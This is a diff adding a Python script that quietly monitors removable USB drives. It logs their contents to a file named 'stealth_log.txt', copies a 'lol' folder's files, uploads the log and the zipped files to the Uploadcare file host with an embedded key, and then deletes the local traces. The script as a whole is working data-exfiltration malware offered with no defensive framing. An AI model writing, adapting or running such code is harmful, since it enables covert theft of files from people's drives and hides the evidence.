@@ -1,0 +1,111 @@
+import os
+import shutil
+import time
+import psutil
+import datetime
+import requests
+
+UPLOADCARE_PUBLIC_KEY = "e543f44f184325ff614a"  # Replace with your actual Uploadcare Public Key
+UPLOADCARE_UPLOAD_URL = "https://upload.uploadcare.com/base/"
+
+# Log message function
+def log_message(message):
+    log_file = "C:\\Users\\Public\\stealth_log.txt"
+    with open(log_file, "a") as file:
+        file.write(f"{message} - {datetime.datetime.now()}\n")
+
+# Detect external drives
+def get_external_drives():
+    drives = []
+    partitions = psutil.disk_partitions()
+    for partition in partitions:
+        if 'removable' in partition.opts:
+            drives.append(partition.device)
+    return drives
+
+# Log drive contents
+def log_drive_contents(drive, log_path):
+    try:
+        contents = os.listdir(drive)
+        folders = [f for f in contents if os.path.isdir(os.path.join(drive, f))]
+        files = sorted(
+            [f for f in contents if os.path.isfile(os.path.join(drive, f))],
+            key=lambda f: os.path.getsize(os.path.join(drive, f)),
+            reverse=True,
+        )
+        with open(log_path, "w") as log_file:
+            log_file.write(f"{drive}: ")
+            log_file.write(", ".join(folders + files) + "\n")
+    except Exception as e:
+        log_message(f"Error logging drive contents: {e}")
+
+# Upload file to Uploadcare
+def upload_to_uploadcare(file_path):
+    try:
+        with open(file_path, "rb") as file:
+            response = requests.post(
+                UPLOADCARE_UPLOAD_URL,
+                files={"file": file},
+                data={"UPLOADCARE_PUB_KEY": UPLOADCARE_PUBLIC_KEY},
+            )
+        if response.status_code == 200:
+            log_message(f"Uploaded {file_path} to Uploadcare: {response.json().get('file')}")
+        else:
+            log_message(f"Upload failed for {file_path}: {response.text}")
+    except Exception as e:
+        log_message(f"Error uploading to Uploadcare: {e}")
+
+# Main function
+def main():
+    monitored_drives = {}
+    log_path = "C:\\Users\\Public\\stealth_log.txt"
+    local_copy_path = "C:\\Users\\Public\\copied_lol"
+
+    while True:
+        time.sleep(5)  # Check every 5 seconds
+        current_drives = get_external_drives()
+
+        # Detect newly connected drives
+        for drive in current_drives:
+            if drive not in monitored_drives:
+                log_message(f"New drive detected: {drive}")
+                monitored_drives[drive] = True
+
+                # Check for "lol" folder and copy its contents
+                lol_folder = os.path.join(drive, "lol")
+                if os.path.exists(lol_folder):
+                    if not os.path.exists(local_copy_path):
+                        os.makedirs(local_copy_path)
+                    for item in os.listdir(lol_folder):
+                        source_path = os.path.join(lol_folder, item)
+                        dest_path = os.path.join(local_copy_path, item)
+                        if os.path.isfile(source_path):
+                            shutil.copy2(source_path, dest_path)
+                        elif os.path.isdir(source_path):
+                            shutil.copytree(source_path, dest_path)
+                    log_message(f"'lol' folder copied from {drive}")
+
+                # Log drive contents
+                log_drive_contents(drive, log_path)
+
+        # Detect removed drives
+        removed_drives = [drive for drive in monitored_drives if drive not in current_drives]
+        for drive in removed_drives:
+            log_message(f"Drive removed: {drive}")
+
+            # Upload log and copied files to Uploadcare
+            upload_to_uploadcare(log_path)
+            if os.path.exists(local_copy_path):
+                shutil.make_archive(local_copy_path, 'zip', local_copy_path)
+                upload_to_uploadcare(local_copy_path + ".zip")
+                shutil.rmtree(local_copy_path)  # Delete copied files
+                os.remove(local_copy_path + ".zip")  # Delete zip file
+            os.remove(log_path)  # Delete log file
+
+            # Remove drive from monitoring
+            del monitored_drives[drive]
+
+if __name__ == "__main__":
+    while(True):
+        time.sleep(5)
+        main()
